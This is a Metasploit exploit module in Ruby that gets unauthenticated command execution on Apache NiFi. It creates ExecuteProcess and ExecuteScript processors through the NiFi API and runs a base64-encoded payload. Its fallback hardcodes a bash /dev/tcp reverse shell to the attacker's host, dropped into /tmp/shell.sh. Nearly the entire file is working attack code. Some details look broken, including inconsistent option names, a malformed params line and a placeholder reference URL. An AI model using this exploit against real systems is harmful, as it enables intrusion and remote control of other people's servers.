##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'
require 'base64'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  HttpFingerprint = { :method => 'GET', :uri => '/nifi-api/flow/about', :pattern => [/NiFi/] }
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name'        => 'NiFi ExecuteScript Process File Creation',
                      'Description' => %q(
    Apache's NiFi application allows users to run system commands
    using API calls to create, start, and stop ExecuteScript and
    ExecuteProcess processors.  If there is no authentication or
    roles set up, any user can use this to get command execution
    on the system.

    Linux Targets: This exploit worked best with a python reverse
    shell in testing.

    Windows Targets: This exploit worked best with a powershell
    reverse shell in testing.

    This has been tested on all Linux versions of NiFi from 1.2.0 to 1.8.0'
    This has been tested on NiFi version 1.8.0 for Windows.'
    ),
      'Author'      => [ 'Ryne Hanson @_hansonet_'],
      'License'     => MSF_LICENSE,
      'References'  =>
    [
      [ 'URL', 'http://google.com' ],
    ],
    'Privileged'  => false,
    'Arch' => [ARCH_CMD, ARCH_PYTHON, ARCH_X86, ARCH_X64],
    'Platform' => %w{ win linux unix },
    'Payload' => {
      'BadChars' => "\x00",
      'Space' => 2000,
      'DisableNops' => true,
      'Compat' => {
        'PayloadType' => 'cmd',
        'ConnectionType' => 'reverse'
      }
    },
    'Targets'     => [ 
      ['Linux', 
       'Platform' => 'unix',
       'Payload' => {
         'PayloadType' => 'cmd'
       },
    ],
    ['Windows',
     'Platform' => 'win',
     'Payload' => {
       'Compat' => {
         'PayloadType' => 'cmd',
         'RequiredCmd' => 'powershell'
       }
     }
       ]
    ],
    'DefaultTarget'  => 0,
    'DisclosureDate' => 'Jun 19 2018'))
    register_options(
      [
        OptString.new('NiFi-Path', [true, 'Location of NiFi API', '/nifi-api']),
        Opt::RPORT(8080)
      ])
    register_advanced_options(
      [
      ])
  end

  def check
    res = send_request_raw({
      'method' => 'GET',
      'uri' => normalize_uri(datastore["NiFi-Path"], '/process-groups/root')
    })
    if res && res.code == 200
      print_status("NiFi Version: #{get_nifi_version}")
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    $target_id = get_target_id

    processor = create_processor("ExecuteProcess", "Executor").get_json_document

    commandArgs = "-c}\"import os; import base64; os.system(base64.b64decode('#{Base64.strict_encode64(payload.encoded)}').decode('utf-8'))\""
    configure_processor(processor, "python", commandArgs)

    print_status("Executing process for shell")
    start_processor(processor)
    sleep(1)

    unless get_processor_status(processor).empty?
      print_error("The server returned an error for process-based execution.")
      sleep(1)
      print_status("The application might be running on docker, or the server doesn't have python installed")
      sleep(1)
      print_status("Trying script-based execution")
      print_warning("This method will not allow for cleaning up...you will have to do it manually!!")

      second_proc = create_script_processor("ExecuteScript", "Scripter").get_json_document

      configure_script_processor(second_proc)
      sleep(1)

      print_status("Attempting via Script Processor...")
      start_processor(second_proc)
      sleep(1)

      # Cleanup if Script Processor Fails
      stop_processor(second_proc)
      sleep(1)
      delete_processor(second_proc)
    end

    # Cleanup
    stop_processor(processor)
    sleep(5)
    delete_processor(processor)
  end

  # Identifies the workspace that API requests will go to
  def get_target_id
    target_id = send_request_cgi({
      'method' => 'GET',
      'uri'=> normalize_uri(datastore["Nifi-Path"], '/process-groups/root')
    }).get_json_document["id"]
  end

  # API calls change depending on the version - this helps change them based on the application version
  def get_nifi_version
    version = send_request_cgi({
      'uri' => normalize_uri(datastore["Nifi-Path"], '/flow/about')}).get_json_document['about']['version']
  end

  # Every change to a processor creates a new version that must be referenced in order to access it again
  def get_processor_version(processor)
    version = send_request_raw({
      'uri' => normalize_uri(datastore["NiFi-Path"], '/processors/', processor['id'])
    }).get_json_document["revision"]["version"]
  end

  # Checks for any errors while running the processors
  # Determines whether or not to attempt using ExecuteScript processors
  def get_processor_status(processor)
    status = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(datastore["Nifi-Path"], 'processors/', processor['id']),
    }).get_json_document['bulletins']
  end

  # Creates an ExecuteProcess processor
  # This is always the first method attempted
  def create_processor(type, name)

    params = {
      :revision => {
        :clientId => "",
        :version => 0
      },
      :component => {
        :type => "org.apache.nifi.processors.standard.#{type}",
        :name => name,
        :position => {
          :x => 0,
          :y => 0
        }
      }
    }

    data_params = JSON.pretty_generate(params)

    processor = send_request_raw({
      'method' => 'POST',
      'uri' => normalize_uri(datastore["NiFi-Path"], '/process-groups/', $target_id, '/processors'),
      'headers' => { 'Accept' => '*/*', 'Content-Type' => 'application/json;charset=UTF-8' },
      'data' => data_params

    })
  end

  def configure_processor(processor, command, commandArgs)

    params = {
      :component => {
        :id => processor["id"],
        :name => processor["component"]["name"],
        :config => {
          :concurrentlySchedulableTaskCount => "1",
          :schedulingPeriod => "5 sec",
          :executionNode => "ALL",
          :penaltyDuration => "30 sec",
          :yieldDuration => "1 sec",
          :bulletinLevel => "WARN",
          :schedulingStrategy => "TIMER_DRIVEN",
          :comments => "",
          :autoTerminatedRelationships => ["success"],
          :properties => {
            :Command => command,
            "Command Arguments": commandArgs,
            "Batch Duration":"5 sec",
            "Redirect Error Stream":"false",
            "Argument Delimiter":"\}"
          }
        },
        :state => "STOPPED"},
        :revision => {
          :clientId => "",
          :version => get_processor_version(processor)
        }
    }

    data_params = JSON.pretty_generate(params)

    configure = send_request_raw({
      'method' => 'PUT',
      'uri' => normalize_uri(datastore["NiFi-Path"], '/processors/', processor['id']),
      'headers' => { 'Accept' => '*/*', 'Content-Type' => 'application/json' },
      'data' => data_params
    })
    return configure
  end

  # Creates an ExcecuteScript processor
  # This is the second attempt if python is not installed on a Linux target
  def create_script_processor(type, name)

    params = {
      :revision => {
        :clientId => "",
        :version => 0
      },
      :component => {
        :type => "org.apache.nifi.processors.script.#{type}",
        :name => name,
        :position => {
          :x => 0,
          :y => 0
        }
      }
    }

    data_params = JSON.pretty_generate(params)

    processor = send_request_raw({
      'method' => 'POST',
      'uri' => normalize_uri(datastore["NiFi-Path"], '/process-groups/', $target_id, '/processors'),
      'headers' => { 'Accept' => '*/*', 'Content-Type' => 'application/json;charset=UTF-8' },
      'data' => data_params
    })
    return processor
  end

  def configure_script_processor(processor)

    # This method should only execute on Linux machines
    # so hardcoding the payload should always work
    cmd1 = 'echo "/bin/bash -i >& /dev/tcp/' + datastore["LHOST"].to_s + "/" + datastore["LPORT"].to_s + ' 0>&1" > /tmp/shell.sh'
    cmd2 = "chmod +x /tmp/shell.sh"
    cmd3 = "/bin/bash /tmp/shell.sh"
    cmd4 = "rm /tmp/shell.sh"

    scriptBody = "import os; os.system('#{cmd1}'); os.system('#{cmd2}'); os.system('#{cmd3}'); os.system('#{cmd4}')"

    params = {
      :component => {
        :id => processor["id"],
        :name => processor["component"]["name"],
        :config => {
          :concurrentlySchedulableTaskCount => "1",
          :schedulingPeriod => "5 sec",
          :executionNode => "ALL",
          :penaltyDuration => "30 sec",
          :yieldDuration => "1 sec",
          :bulletinLevel => "WARN",
          :schedulingStrategy => "TIMER_DRIVEN",
          :comments => "",
          :autoTerminatedRelationships => ["failure","success"],
          :properties => {
            "Script Engine":"python",
            "Script Body":scriptBody
          }
        },
        :state => "STOPPED"},
        :revision => {
          :clientId => "",
          :version => get_processor_version(processor)
        }
    }
    if get_nifi_version != '1.2.0'
      params[:diconnectedNodeAcknowledged => "false"]
    end

    data_params = JSON.pretty_generate(params)

    configure = send_request_raw({
      'method' => 'PUT',
      'uri' => normalize_uri(datastore["NiFi-Path"], '/processors/', processor['id']),
      'headers' => { 'Accept' => '*/*', 'Content-Type' => 'application/json' },
      'data' => data_params
    })
    return configure
  end

  def start_processor(processor)
    params = {
      :revision => {
        :clientId => "",
        :version => get_processor_version(processor)
      },
      :component => {
        :id => processor["id"],
        :state => "RUNNING"
      }
    }

    data_params = JSON.pretty_generate(params)

    startProcess = send_request_raw({
      'method' => 'PUT',
      'uri' => normalize_uri(datastore["NiFi-Path"], '/processors/', processor['id']),
      'headers' => { 'Accept' => '*/*', 'Content-Type' => 'application/json;charset=UTF-8' },
      'data' => data_params
    })
  end

  def stop_processor(processor)

    params = {
      :revision => {
        :clientId => "",
        :version => get_processor_version(processor)
      },
      :component => {
        :id => processor["id"],
        :state => "STOPPED"
      }
    }

    data_params = JSON.pretty_generate(params)

    stopProcess = send_request_raw({
      'method' => 'PUT',
      'uri' => normalize_uri(datastore["NiFi-Path"], '/processors/', processor['id']),
      'headers' => { 'Accept' => '*/*', 'Content-Type' => 'application/json;charset=UTF-8' },
      'data' => data_params
    })
  end

  def delete_processor(processor)
    deleteProcessor = send_request_cgi({
      'method' => 'DELETE',
      'uri' => normalize_uri(datastore["NiFi-Path"], '/processors/', processor['id']),
      'vars_get' => {
        'version' => get_processor_version(processor).to_s,
        'clientId' => ''
      }
    })
    return deleteProcessor
  end

end
